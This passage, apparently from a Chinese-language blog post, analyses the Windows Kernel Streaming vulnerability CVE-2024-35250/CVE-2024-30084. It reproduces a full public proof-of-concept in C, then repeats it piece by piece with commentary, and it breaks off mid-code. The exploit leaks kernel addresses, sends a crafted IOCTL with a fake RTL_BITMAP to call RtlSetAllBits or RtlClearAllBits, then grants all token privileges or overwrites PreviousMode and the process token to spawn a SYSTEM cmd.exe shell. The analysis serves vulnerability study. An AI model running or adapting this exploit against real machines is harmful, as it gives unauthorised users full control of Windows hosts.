class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BITMAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG SizeOfBitMap;                                               </span><br><span class="line">    ULONG* Buffer;                                                   </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>我们可将Buffer 指定到任意位置并指定大小，就可以将一段范围的bits 全部设置起来，到这边就差不多结束了，只要将<code>Token-&gt;Privilege</code>全部设置起来，就可以利用Abuse Privilege 方法来做到EoP 了</p><p>下述PoC中还有一种利用方式，首先利用<code>RtlClearAllBits</code>将当前线程的<code>PreviousMode</code>设置为<code>KernelMode</code>，然后利用任意写的能力，直接替换当前进程的TOKEN为System进程的TOKEN，达到提权的目的</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>网上已经有了公开的poc，让我们分析一手</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PoC Info</span></span><br><span class="line"><span class="comment">--------------------------------------------------------------</span></span><br><span class="line"><span class="comment">Vulnerability:        CVE-2024-35250/CVE-2024-30084</span></span><br><span class="line"><span class="comment">Tested environment:    Windows 11 22h2 Build 22621</span></span><br><span class="line"><span class="comment">Windows 10 20h2 Build 19042</span></span><br><span class="line"><span class="comment">VMWare Workstation 17 Pro</span></span><br><span class="line"><span class="comment">Weakness:        CWE-822: Untrusted Pointer Dereference</span></span><br><span class="line"><span class="comment">Required privileges:    Medium IL</span></span><br><span class="line"><span class="comment">--------------------------------------------------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __STREAMS__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _INC_MMREG</span></span><br><span class="line"><span class="comment">//#define _SEP_TOKEN_PRIVILEGES0xc1b4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PREVIOUS_MODE0xbaba</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ksproxy.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ksuser.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdllp.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;SetupAPI.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Advapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">BOOL res = FALSE;</span><br><span class="line">NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> Ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">hDevice = <span class="built_in">GetKsDevice</span>(KSCATEGORY_DRM_DESCRAMBLE);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"></span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="type">uint64_t</span> ktoken_obj = <span class="number">0</span>;</span><br><span class="line">res = <span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ALL_ACCESS, &amp;hToken);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!res)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open current process token\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">GetObjPtr</span>(&amp;ktoken_obj, <span class="built_in">GetCurrentProcessId</span>(), hToken);</span><br><span class="line"><span class="keyword">if</span> (res != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current process TOKEN address = %llx\n&quot;</span>, ktoken_obj);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> Sysproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> Curproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> Curthread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hCurproc = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak System _EPROCESS kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Sysproc, <span class="number">4</span>, (HANDLE)<span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address: %llx\n&quot;</span>, Sysproc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak Current _KTHREAD kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, TRUE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="keyword">if</span> (hThread != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Curthread, <span class="built_in">GetCurrentProcessId</span>(), hThread);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current KTHREAD address: %llx\n&quot;</span>, Curthread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak Current _EPROCESS kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">hCurproc = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, TRUE, <span class="built_in">GetCurrentProcessId</span>());</span><br><span class="line"><span class="keyword">if</span> (hCurproc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Curproc, <span class="built_in">GetCurrentProcessId</span>(), hCurproc);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address: %llx\n&quot;</span>, Curproc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize input buffer</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pInBufProperty-&gt;Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pInBufProperty-&gt;Flags = KSPROPERTY_TYPE_UNSERIALIZESET;</span><br><span class="line">pInBufProperty-&gt;Id = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize output buffer</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pSerialHdr-&gt;PropertySet = KSPROPSETID_DrmAudioStream;</span><br><span class="line"></span><br><span class="line">pSerialHdr-&gt;Count = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">pSerial-&gt;PropertyLength = <span class="built_in">sizeof</span>(EXPLOIT_DATA1);</span><br><span class="line">pSerial-&gt;Id = <span class="number">0x0</span>;                <span class="comment">// Should be null</span></span><br><span class="line">pSerial-&gt;PropTypeSet.Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pSerial-&gt;PropTypeSet.Flags = <span class="number">0x0</span>; <span class="comment">// Should be null</span></span><br><span class="line">pSerial-&gt;PropTypeSet.Id = <span class="number">0x45</span>;   <span class="comment">// Irrelevant value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Intialize fake property data</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">uint64_t</span> ntoskrnl_user_base = <span class="number">0</span>;</span><br><span class="line">HMODULE outModule = <span class="number">0</span>;</span><br><span class="line">UINT_PTR ntoskrnlBase = <span class="built_in">GetKernelModuleAddress</span>(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] ntoskrnl.exe base address = %llx\n&quot;</span>, ntoskrnlBase);</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap = (PRTL_BITMAP)<span class="built_in">AllocateBitmap</span>(<span class="built_in">sizeof</span>(RTL_BITMAP), <span class="built_in">Ptr64</span>(<span class="number">0x10000000</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// FakeBitmap initialization for the overwriting TOKEN.Privileges fields technique</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// It should be (0x20 * n) to overwrite (n/2 * 0x8) bytes at arbitrary address</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span> * <span class="number">4</span>;</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = <span class="built_in">Ptr64</span>(ktoken_obj + TOKEN_PRIV_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = <span class="built_in">Ptr64</span>(<span class="built_in">leak_gadget_address</span>(<span class="string">&quot;RtlSetAllBits&quot;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] RtlSetAllBits kernel address = %p\n&quot;</span>, pInBufPropertyData-&gt;ptr_ArbitraryFunCall);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// FakeBitmap initialization for the overwriting KTHREAD.PreviousMode field technique</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span>;</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = <span class="built_in">Ptr64</span>(Curthread + PREV_MODE_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = <span class="built_in">Ptr64</span>(<span class="built_in">leak_gadget_address</span>(<span class="string">&quot;RtlClearAllBits&quot;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] RtlClearAllBits kernel address = %p\n&quot;</span>, pInBufPropertyData-&gt;ptr_ArbitraryFunCall);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Send property request to trigger the vulnerability</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">res = <span class="built_in">SendIoctlReq</span>(hDevice);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!res)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] SendIoctlReq failed\n&quot;</span>); <span class="comment">// It&#x27;s ok to see this message if exploit succeded</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"></span><br><span class="line">HANDLE hWinLogon = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, <span class="built_in">GetPidByName</span>(<span class="string">L&quot;winlogon.exe&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!hWinLogon)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed with error = %lx\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateProcessFromHandle</span>(hWinLogon, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Leveraging DKOM to achieve LPE\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Calling Write64 wrapper to overwrite current EPROCESS-&gt;Token\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">KPROCESSOR_MODE mode = UserMode; <span class="comment">// We set UserMode in restoring thread state phase to avoid BSOD in further process creations</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Write64</span>(<span class="built_in">Ptr64</span>(Curproc + EPROCESS_TOKEN_WIN_11_22H2_22621), <span class="built_in">Ptr64</span>(Sysproc + EPROCESS_TOKEN_WIN_11_22H2_22621), TOKEN_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Restoring KTHREAD.PreviousMode phase</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">Write64</span>(<span class="built_in">Ptr64</span>(Curthread + PREV_MODE_WIN_11_22H2_22621), &amp;mode, <span class="built_in">sizeof</span>(mode));</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Spawn the shell with &quot;nt authority\system&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PoC执行流程的详细分析"><a href="#PoC执行流程的详细分析" class="headerlink" title="PoC执行流程的详细分析"></a>PoC执行流程的详细分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 条件编译选择利用方式</span></span><br><span class="line"><span class="comment">//#define _SEP_TOKEN_PRIVILEGES0xc1b4  // TOKEN权限修改方式</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PREVIOUS_MODE0xbaba    <span class="comment">// PreviousMode绕过方式</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 必要的库依赖</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ksproxy.lib&quot;</span>)    <span class="comment">// KS代理库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ksuser.lib&quot;</span>)     <span class="comment">// KS用户模式库  </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdllp.lib&quot;</span>)     <span class="comment">// NT内核库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;SetupAPI.lib&quot;</span>)   <span class="comment">// 设备枚举API</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Advapi32.lib&quot;</span>)   <span class="comment">// 高级API</span></span></span><br></pre></td></tr></table></figure><h4 id="设备获取和地址泄露"><a href="#设备获取和地址泄露" class="headerlink" title="设备获取和地址泄露"></a>设备获取和地址泄露</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取DRM设备句柄</span></span><br><span class="line">hDevice = <span class="built_in">GetKsDevice</span>(KSCATEGORY_DRM_DESCRAMBLE);</span><br></pre></td></tr></table></figure><p>该函数通过<code>KSCATEGORY_DRM_DESCRAMBLE</code> GUID获取DRM解扰设备的句柄。这是利用Kernel Streaming漏洞的入口点。</p><p><strong>地址泄露阶段(仅_PREVIOUS_MODE模式)：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. 泄露System进程EPROCESS地址</span></span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Sysproc, <span class="number">4</span>, (HANDLE)<span class="number">4</span>);  <span class="comment">// PID 4是System进程</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address: %llx\n&quot;</span>, Sysproc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 泄露当前线程KTHREAD地址  </span></span><br><span class="line">hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, TRUE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Curthread, <span class="built_in">GetCurrentProcessId</span>(), hThread);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current KTHREAD address: %llx\n&quot;</span>, Curthread);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 泄露当前进程EPROCESS地址</span></span><br><span class="line">hCurproc = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, TRUE, <span class="built_in">GetCurrentProcessId</span>());</span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Curproc, <span class="built_in">GetCurrentProcessId</span>(), hCurproc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address: %llx\n&quot;</span>, Curproc);</span><br></pre></td></tr></table></figure><h4 id="构造恶意IOCTL请求"><a href="#构造恶意IOCTL请求" class="headerlink" title="构造恶意IOCTL请求"></a>构造恶意IOCTL请求</h4><p><strong>输入缓冲区初始化：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pInBufProperty-&gt;Set = KSPROPSETID_DrmAudioStream;    <span class="comment">// 属性集GUID</span></span><br><span class="line">pInBufProperty-&gt;Flags = KSPROPERTY_TYPE_UNSERIALIZESET;  <span class="comment">// 关键：触发UnserializePropertySet</span></span><br><span class="line">pInBufProperty-&gt;Id = <span class="number">0x0</span>;</span><br></pre></td></tr></table></figure><p><strong>输出缓冲区初始化：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pSerialHdr-&gt;PropertySet = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pSerialHdr-&gt;Count = <span class="number">0x1</span>;  <span class="comment">// 属性数量</span></span><br><span class="line"></span><br><span class="line">pSerial-&gt;PropertyLength = <span class="built_in">sizeof</span>(EXPLOIT_DATA1);</span><br><span class="line">pSerial-&gt;Id = <span class="number">0x0</span>;</span><br><span class="line">pSerial-&gt;PropTypeSet.Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pSerial-&gt;PropTypeSet.Flags = <span class="number">0x0</span>;</span><br><span class="line">pSerial-&gt;PropTypeSet.Id = <span class="number">0x45</span>;</span><br></pre></td></tr></table></figure><h4 id="构造伪造的RTL-BITMAP结构"><a href="#构造伪造的RTL-BITMAP结构" class="headerlink" title="构造伪造的RTL_BITMAP结构"></a>构造伪造的RTL_BITMAP结构</h4><p><strong>获取ntoskrnl.exe基址：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UINT_PTR ntoskrnlBase = <span class="built_in">GetKernelModuleAddress</span>(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] ntoskrnl.exe base address = %llx\n&quot;</span>, ntoskrnlBase);</span><br></pre></td></tr></table></figure><p><strong>根据利用模式构造不同的FakeBitmap：</strong></p><p><strong>模式1 - TOKEN权限修改：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span> * <span class="number">4</span>;  <span class="comment">// 覆盖32字节</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = <span class="built_in">Ptr64</span>(ktoken_obj + TOKEN_PRIV_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = <span class="built_in">Ptr64</span>(<span class="built_in">leak_gadget_address</span>(<span class="string">&quot;RtlSetAllBits&quot;</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>模式2 - PreviousMode绕过：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span>;  <span class="comment">// 覆盖32字节</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = <span class="built_in">Ptr64</span>(Curthread + PREV_MODE_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = <span class="built_in">Ptr64</span>(<span class="built_in">leak_gadget_address</span>(<span class="string">&quot;RtlClearAllBits&quot;</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h4 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="built_in">SendIoctlReq</span>(hDevice);</span><br></pre></td></tr></table></figure><p>此函数发送构造的IOCTL请求到KS设备，触发<code>ks!UnserializePropertySet</code>中的漏洞代码路径</p><h4 id="提权利用"><a href="#提权利用" class="headerlink" title="提权利用"></a>提权利用</h4><p><strong>模式1 - TOKEN权限提权：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"><span class="comment">// 打开winlogon.exe进程(拥有SYSTEM权限)</span></span><br><span class="line">HANDLE hWinLogon = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, <span class="built_in">GetPidByName</span>(<span class="string">L&quot;winlogon.exe&quot;</span>));</span><br><span class="line"><span class="comment">// 从高权限进程创建新进程</span></span><br><span class="line"><span class="built_in">CreateProcessFromHandle</span>(hWinLogon, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>模式2 - DKOM(Direct Kernel Object Manipulation)提权：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 